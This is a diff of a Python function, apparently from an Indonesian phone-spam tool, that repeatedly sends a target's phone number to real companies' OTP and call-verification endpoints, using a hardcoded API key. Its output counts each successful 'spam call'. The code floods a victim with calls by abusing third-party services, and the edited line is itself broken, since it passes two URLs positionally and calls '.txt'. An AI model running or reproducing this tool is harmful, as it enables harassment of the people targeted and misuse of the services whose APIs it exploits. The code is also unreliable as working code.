@@ -32,7 +32,7 @@ def spam_call(nomor):
 		date = {"number": nomor,"country_code":"+62","type":"CITCALL"}
 		ses.headers.update({"x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "Key": "Um9jaG1hdCBCYXN1a2k="})
 		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
-		post = ses.post("https://beta.api.saturdays.com/api/v1/user/otp/send":"https://srv3.sampingan.co.id/auth/generate-otp", data=date).txt
+		post = ses.post("https://beta.api.saturdays.com/api/v1/user/otp/send", "https://srv3.sampingan.co.id/auth/generate-otp", data=date).txt
 		if "True" in str(post): no += 1; print(f"[{no}] sukses spam call")
 		else: print("[*] terkena limit call")
 		ses.cookies.clear(); ses.close()
